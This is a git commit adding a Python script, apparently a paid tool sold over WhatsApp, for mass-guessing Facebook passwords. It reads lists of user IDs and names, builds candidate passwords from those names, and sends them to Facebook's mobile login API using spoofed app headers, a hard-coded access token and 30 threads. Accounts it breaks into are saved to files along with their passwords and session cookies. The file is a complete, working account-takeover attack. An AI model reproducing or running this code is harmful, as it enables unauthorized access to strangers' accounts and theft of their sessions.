a9a70d794ff9f8478478446824317444386bf64e
Sheraz218 <alikhant4546@gmail.com>
2025-05-25 20:50:41 +0500

    Add files via upload

---
+++ smz.py
@@ -0,0 +1,409 @@
+import os,sys,glob,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re,hashlib
+import datetime,subprocess
+import zipfile
+import marshal
+from uuid import uuid4
+from time import sleep as sp
+os.system("clear")
+print('\x1b[1;92m [√] MR SHERAZ XD:)🤪')
+#######print('\x1b[1;92m [√] Join  Whatapps group 🔥️')
+######os.system('xdg-open https://chat.whatsapp.com/GmhsxmuV1vt8A6sfQUyoWz')
+hashes = []
+#<<_________[ SECURITY CODE ]_________>>#
+try:
+    os.system('rm -'+'rf /sd'+'card/.txt');os.system('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
+except PermissionError:
+    os.system("clear")
+    print(f"\033[97;1m [\033[92;1m•\033[97;1m] Ple"+"ase Allo"+"w Sto"+"rage P"+"ermi"+"ssio"+"n Fo"+"r Sa"+"ve Fi"+"le Th"+"en R"+"un A"+"gain");os.system('termux-setup-storage');os.system('clear');exit(f"\033[97;1m [\033[92;1m•\033[97;1m] Ru"+"n Aga"+"in Thi"+"s To"+"ol !!")
+
+########_______________________________##########
+def baloch():
+    abc = ["A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
+    pkgs = random.choice(['com.facebook.katana','com.facebook.mlite','com.facebook.lite','com.facebook.adsmanager','com.facebook.liteh'])
+    build = random.choice(abc)+random.choice(abc)+random.choice(abc)
+    FBBV = str(random.randint(111111111,999999999))
+    FBCR = random.choice(["Jazz","Zong","Mobilink","Ufone","Telenor","Warid","Djuice","Vodafone"])
+    sm = f"SM-G{random.randint(880,975)}U"
+    ua = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/48.0.0.3.179;FBBV/482983480;FBDM/{density=1.5,width=780,height=1491};FBLC/ro_RO;FBRV/0;FBCR/TNT;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]"+"[FBAN/FB4A;FBAV/110.0.0.7.92;FBBV/53859033;FBDM/{density=2.1,width=720,height=1240};FBLC/en_PK;FBCR/Orange;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530T;FBSV/11.0.4;FBOP/1;FBCA/arm64-v8a:armeabi-v7l-armeabi;]"+"[FBAN/FB4A;FBAV/10.0.0.16.138;FBBV/42017614;FBDM/{density=1.6,width=780,height=980};FBLC/en_US;FBCR/Cellcom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-N7100;FBSV/4.2.3;FBOP/1;FBCA/arm64-v8a:armeabi-v7l-armeabi;]"+"[FBAN/FB4A;FBAV/314.0.0.26.70;FBBV/20612468;FBDM/{density=1.5,width=920,height=1920};FBLC/en_PK;FBCR/Roshan;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530T;FBSV/9.2.2;FBOP/1;FBCA/arm64-v8a:armeabi-v7l-armeabi;]"+"[FBAN/FB4A;FBAV/267.0.0.238.297;FBBV/289051961;FBDM/{density=1.5,width=1980,height=1980};FBLC/fr_BJ;FBCR/MTN;FBMF/Huawei;FBBD/P50;FBPN/com.facebook.katana;FBDV/ELS-NX9/10;FBSV/10;FBLR/fr_BJ;FBOP/1;FBCA/arm64-v8a:armeabi-v7l-armeabi;]"
+    return ua
+###_____________Timeanddate____########
+import time
+from datetime import date
+from datetime import datetime
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+#####_______________&&&&&&&&&____#####
+try:
+    import bs4
+    from bs4 import BeautifulSoup as pars
+except ModuleNotFoundError:
+    os.system('pip install bs4')
+except Exception as e:
+    print(e)
+from concurrent.futures import ThreadPoolExecutor as tpe
+import requests
+from requests.exceptions import ConnectionError as CE
+##______COLORS____ARE________######
+pwx=[]
+W = '\033[97;1m'
+R = '\033[91;1m'
+G = '\033[92;1m'
+Y = '\033[93;1m'
+B = '\033[94;1m'
+P = '\033[95;1m'
+S = '\033[96;1m'
+N = '\x1b[0m'
+PURPLE ='\x1b[38;5;46m'
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m'
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+BLACK="\033[1;30m"
+EXTRA ='\x1b[38;5;208m'
+###########__________defline___________#############
+def line():
+    print(49*'=')
+
+def p(x):
+    print(x)
+#__________________ [ Lists Used in Script]______________
+id = []
+ok = []
+cp = []
+loop = 0
+method=[]
+SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
+ses = requests.Session()
+def logo():
+    sys.stdout.write('\x1b]2; FUCK OFF\x07')
+    os.system('clear')
+    logo = (f'''  {W}
+    ######   ##     ## ######## 
+    ##    ## ###   ###      ##  
+    ##       #### ####     ##   
+     ######  ## ### ##    ##    
+          ## ##     ##   ##     
+    ##    ## ##     ##  ##      
+     ######  ##     ## ######## 
+                                    \033[1;91mXD
+{W}-----------------------------------------
+{W} [•] Owner    : SHERAZ KING
+{W} [•] Status   : PAID
+ [•]{G} Version  : 1.7
+\033[1;37m ---------------------------------------''')
+    p(logo)
+def clear():
+    os.system("clear")
+    logo()
+####_______________________&_______________############
+class iAmMain:
+    def __init__(self):
+        self.gp = "https://b-graph.facebook.com/auth/login"
+        self.ap = "https://b-api.facebook.com/auth/login"
+    def iAmMenu(self):
+        clear()
+        p(" [\033[91;1m1\033[1;37m] File Cloning ")
+        p(" [\033[91;1m2\033[1;37m] Create File ")
+        p(" [\033[91;1mE\033[1;37m] Exit Tool ")
+        line()
+        opt1 = input(" [•] Select An Option : ")
+        if opt1 == "1":self.file_menu()
+        if opt1 == "2":self.dump_menu()
+        elif opt1 == "3":Grep().with_names()
+        elif opt1 == "4":Join().Whatsapp()
+        elif opt1 == "E":exit(" [•] Good Bye !!!!!!! ")
+        else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
+########___________________FILE_dump__________#########
+    def dump_menu(self):
+        os.system("cd && git clone --depth=1 https://github.com/binyamin-binni2/dump")
+        os.system('cd && cd dump ;.')
+########___________________FILE_Menu________############
+    def file_menu(self):
+        #check_again()
+        logo()
+        p(" [•] \033[1;37mExample \033[91;1m/sdcard/SMZ.txt\033[1;91m")
+        file = input(" [•] \033[1;37mPut File Path : ")
+        try:
+            id = open(file,"r").read().splitlines()
+            self.method_select(id)
+        except FileNotFoundError:
+            p(" [•] File Path Incorrect ")
+            sp(2);self.file_menu()
+        
+    def method_select(self,id):
+        #check_again()
+        logo()
+        p(" [1] \033[1;37mMethod 1 ")
+        p (" [2] \033[1;37mMethod 2 ")
+        p (" [3] \033[1;37mMethod 3 ")
+        line()
+        m_opt = input(" [•] Choose : ")
+        if m_opt =='1':
+            method.append("i")
+            self.password_menu(id)
+        if m_opt =='2':
+            method.append('ii')
+            self.password_menu(id)
+        else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)
+######passsword__setup######
+    def password_menu(self,id):
+        #check_again()
+        pwx=[]
+        logo()
+        max = 20
+        p(" [•] Example 1 , 2 , 3  to 20 Max ")
+        try:
+            plimit = int(input(" [•] Pass limit : "))
+            if plimit =="":
+                plimit = 4
+            elif plimit > max:
+                p(" [•] Password Limit =20 ");sp(2);self.password_menu()
+        except:
+            plimit = 4
+        logo()
+        p(" [•] Enter Passwords :\033[92;1m firstlast First Last etc\033[1;37m")
+        line()
+        for n in range(plimit):
+            pwx.append(input(" [•] Put Password %s : "%(n+1)))
+        logo()
+        
+        p(" [•] Total Accounts : \033[92;1m%s "%(str(len(id))))
+        p(" \033[91;1m[•] If No Result Use Flight Mode\033[97;1m") 
+        line()
+        with tpe(max_workers=30) as saqi:
+            for user in id:
+                uid = user.split("|")[0]
+                nm = user.split("|")[1]
+                if "i" in method:
+                    saqi.submit(self.method1,uid,nm,pwx)
+                elif "ii" in method:
+                    saqi.submit(self.method2,uid,nm,pwx)
+        self.saved_results(ok,cp)
+    def saved_results(self,ok,cp):
+        line()
+        p(" [•] Cloning Has been Completed ")
+        p(" [•] Total Ok Accounts : %s "%(len(ok)))
+        p(" [•] Total Cp Accounts : %s "%(len(cp)))
+        line()
+        input(" [•] Press Enter To Go Back ")
+        self.iAmMenu()
+#####______________mtha1_________________##########
+    def method1(self,uid,nm,pwx):
+        try:
+            global ok , cp , loop
+            sys.stdout.write('\r [SMZ-M1] %s OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+            fn = nm.split(' ')[0]
+            try:
+                ln = nm.split(' ')[1]
+            except:
+                ln = fn
+            for ps in pwx:
+                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
+                data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": uid,
+"password": pw,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_US",
+"client_country_code": "US",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': baloch(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if "session_key" in q:
+                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                    cookie = f"sb={sb};{coki}"
+                    p('\r\033[1;92m[SMZ-OK] %s | %s \033[1;97m '%(uid,pw))
+                    ok.append(uid)
+                    open('/sdcard/SMZ-OK.txt','a').write(uid+'|'+pw+'\n')
+                    open('/sdcard/SMZ-OK-COOKIE.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                    p('\r\033[1;91m[SMZ-CP] %s | %s \033[1;97m '%(uid,pw))
+                    cp.append(uid)
+                    open('/sdcard/SMZ-CP.txt','a').write(uid+'|'+pw+'\n')
+                    break
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+                self.method1(uid,nm,pwx)
+#####_____________method2_________#####
+    def method2(self,uid,nm,pwx):
+        try:
+            global ok , cp , loop
+            sys.stdout.write('\r [SMZ-M2] %s  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
+            fn = nm.split(' ')[0]
+            try:
+                ln = nm.split(' ')[1]
+            except:
+                ln = fn
+            for ps in pwx:
+                pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
+                data = {"adid": str(uuid.uuid4()),
+"format": "json",
+"device_id": str(uuid.uuid4()),
+"cpl": "true",
+"family_device_id": str(uuid.uuid4()),
+"credentials_type": "device_based_login_password",
+"error_detail_type": "button_with_disabled",
+"source": "device_based_login",
+"email": uid,
+"password": pw,
+"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+"generate_session_cookies": "1",
+"meta_inf_fbmeta": "",
+"advertiser_id": str(uuid.uuid4()),
+"currently_logged_in_userid": "0",
+"locale": "en_GB",
+"client_country_code": "PK",
+"method": "auth.login",
+"fb_api_req_friendly_name": "authenticate",
+"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+"api_key": "882a8490361da98702bf97a021ddc14d"}
+                headers = {'User-Agent': baloch(),
+'Content-Type': 'application/x-www-form-urlencoded',
+'Host': 'graph.facebook.com',
+'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+'X-FB-Connection-Type': 'MOBILE.LTE',
+'X-Tigon-Is-Retry': 'False',
+'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+'x-fb-device-group': '5120',
+'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+'X-FB-Request-Analytics-Tags': 'graphservice',
+'X-FB-HTTP-Engine': 'Liger',
+'X-FB-Client-IP': 'True',
+'X-FB-Server-Cluster': 'True',
+'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
+                q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
+                if "session_key" in q:
+                    coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                    cookie = f"sb={sb};{coki}"
+                    p('\r\033[1;92m[SMZ-OK] %s | %s \033[1;97m '%(uid,pw))
+                    ok.append(uid)
+                    open('/sdcard/SMZ-OK.txt','a').write(uid+'|'+pw+'\n')
+                    open('/sdcard/SMZ-OK-COOKIE.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
+                    break
+                elif 'www.facebook.com' in q['error']['message']:
+                    p('\r\033[1;91m[SMZ-CP] %s | %s \033[1;97m '%(uid,pw))
+                    cp.append(uid)
+                    open('/sdcard/SMZ-CP.txt','a').write(uid+'|'+pw+'\n')
+                    break
+                else:
+                    continue
+            loop+=1
+        except requests.exceptions.ConnectionError:
+                self.method2(uid,nm,pwx)
+#######_________________join________&#########
+class Join:
+    def Whatsapp(self):
+        os.system('xdg-open https://facebook.com/groups/1937425263394282/')
+        iAmMain().iAmMenu()
+#######___________________Name_____________#######
+class Grep:
+    def __init__(self):
+        self.url = "https://free.facebook.com"
+    def with_names(self):
+        clear()
+        logo()
+        lines=[]
+        p(" [•] Ex : /sdcard/file.txt")
+        try:
+            file = input(" [•] Put File Path : ")
+        except Exception as e:
+            print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
+        digit= int(input(" [•] Put Line Num :"))
+        with open(file,"r") as r:
+            lines = r.readlines()
+        with open(file,"w") as w:
+            for num,line in enumerate(lines):
+                if num >= digit:
+                    w.write(line)
+        p(" [•] File  Complete")
+        input(" [•] Press Enter to go back ")
+        iAmMain().iAmMenu()
+##########_______________END-Setup________________#####   
+def approval():
+  clear()
+  myid = str(os.getuid())
+  myid=myid.upper()[::-1]
+  n=re.findall("(\d\d)",myid)
+  plat=platform.version()[2:][:8][::-1].upper()+platform.release()[3:][::-1].upper()+platform.version()[:2]
+  xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+  id = "".join(myid)
+  idd = "SHERAZ KING"
+  Key = idd+id+xp
+  
+
+  try:
+    httpCaht = requests.get('https://github.com/Sheraz218/SMZ/blob/main/Aprovle.txt').text
+    if id in httpCaht:
+      print("\33[1;32m YOUR KEY IS APPROVED.")
+      msg = str(os.geteuid())
+      time.sleep(0.5)
+      iAmMain().iAmMenu()
+      pass
+    else:
+      print(f"{R} YOUR KEY  :{G}  " +Key)
+      line()
+      print(f"{B} NOTE      :  WELCOME TO SMZ TOOL{W}")
+      line()
+      print(f"{R} TOOL IS PAID YOU HAVE TO\n PAY FOR APPROVAL")
+      line()
+      print(f" {G}For Pakistan ==={W }Easypaisa : {G}03229603596")
+      print(f" {W}Rs.400 For 15 Days")
+      print(f" {W}Rs.800 For 1 Month")
+      print(f" {G}For Other Countrys ==={W} Binance : {G}971170790")
+      print(f"  {W}6$ For 15 Days")
+      print(f"  {W}10$ For 1 Month")
+      print(f" {W}COPY YOUR KEY SEND TO ADMIN FOR APPROVAL")
+      input(f'{G} IF YOU WANT TO BUY THEN PRESS ENTER ')
+      tks = ('*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*SMZ*%20*TOOL*%20*PAID*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20'+Key);os.system('am start https://wa.me/+923136751626?text='+tks),approval() 
+      time.sleep(1)
+      approval()
+  except:
+    sys.exit()
+approval()
+iAmMain().iAmMenu()
